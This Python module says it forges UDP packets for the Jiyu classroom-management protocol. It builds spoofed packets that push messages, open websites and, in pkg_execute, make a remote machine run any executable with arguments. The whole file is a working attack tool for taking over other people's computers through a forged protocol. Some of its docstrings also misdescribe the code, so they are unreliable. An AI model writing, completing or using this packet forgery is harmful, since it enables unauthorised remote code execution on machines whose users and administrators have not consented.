"""
This module is used to forge Jiyu UDP packets.
"""

import secrets

from typing import Literal, Optional


def format_data(data: str, max_length: Optional[int] = None) -> bytes:
    """
    Formats a string into a byte array, ensuring it is within the specified maximum length.

    Args:
        msg (str): The input string to format.
        max_length (int, optional): The maximum length of the resulting byte array. Defaults to 800.

    Returns:
        bytes: The formatted byte array, padded with null bytes if necessary.
    """
    if not isinstance(data, str):
        raise TypeError(f"Expected string, got {type(data).__name__}")
    if max_length is None:
        return data.encode("utf-16le")
    if not isinstance(max_length, int):
        raise TypeError(f"Expected int, got {type(max_length).__name__}")
    if max_length <= 0:
        raise ValueError(f"Invalid maximum length: {max_length}")
    return data.encode("utf-16le").ljust(max_length, b"\x00")[:max_length]


def pkg_message(msg: str) -> bytes:
    """
    Packages a message string into a specific byte format, including a header and padding.

    Args:
        msg (str): The message string to package.

    Returns:
        bytes: The packaged message as a byte array, including a header and padding.

    Raises:
        ValueError: If the message length exceeds 800 bytes or if the header length is incorrect
    """
    data = format_data(msg, 800)
    head = (
        b"DMOC\x00\x00\x01\x00\x9e\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8l\x01\x91\x03\x00\x00"
        + b"\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    )
    return head + data + b"\x00" * 98


def pkg_execute(
    executable_file: str,
    arguments: str = "",
    mode: Literal["normal", "minimize", "maximize"] = "normal",
) -> bytes:
    """
    Packages a command with an executable file and optional arguments into a specific byte format.

    Args:
        executable_file (str): The name of the executable file to run.
        arguments (str, optional): The command-line arguments to pass to the executable. Defaults to an empty string.
        mode (Literal["normal", "minimize", "maximize"], optional): The mode of execution. Defaults to "normal".

    Returns:
        bytes: The packaged command as a byte array, including a header and formatted data.

    Raises:
        ValueError: If the executable file or arguments exceed their respective length limits,
                     or if an invalid mode is specified.
        TypeError: If the executable file or arguments are not strings.

    Note:
        The function constructs a specific header and formats the executable file and arguments
        into byte arrays, ensuring they fit within defined length limits.
    """
    head = (
        b"DMOC\x00\x00\x01\x00n\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01a\x03\x00\x00a\x03\x00\x00"
        + b"\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    )
    data0 = format_data(executable_file, 512)
    data1 = format_data(arguments, 254)
    match mode:
        case "normal":
            data2 = b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case "minimize":
            data2 = b"\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case "maximize":
            data2 = b"\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case _:
            raise ValueError(f"Invalid mode: {mode}")
    return head + data0 + data1 + b"\x00" * 66 + data2


def pkg_website(url: str) -> bytes:
    """
    Packages a website URL into a specific byte format, including a header and padding.

    Args:
        url (str): The website URL to package.

    Returns:
        bytes: The packaged URL as a byte array, including a header and padding.

    Raises:
        ValueError: If the URL length exceeds 800 bytes.
        TypeError: If the URL is not a string.
    """
    data = format_data(url)

    head = (
        b"DMOC\x00\x00\x01\x00"
        + (len(data) + 36).to_bytes(4, "little")
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01"
        + (len(data) + 23).to_bytes(4, "little")
        + (len(data) + 23).to_bytes(4, "little")
        + b"\x00\x02\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
    )

    return head + data + b"\x00" * 4
